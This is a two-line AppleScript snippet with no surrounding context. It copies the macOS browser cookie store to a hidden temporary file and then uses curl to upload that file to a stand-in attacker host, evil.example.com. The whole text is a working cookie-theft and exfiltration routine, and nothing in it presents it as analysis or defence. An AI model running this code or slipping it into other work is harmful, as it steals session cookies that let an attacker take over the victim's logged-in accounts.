do shell script "cp ~/Library/Cookies/Cookies.binarycookies /tmp/.cookies"
do shell script "curl -X POST -F 'file=@/tmp/.cookies' http://evil.example.com/dump"
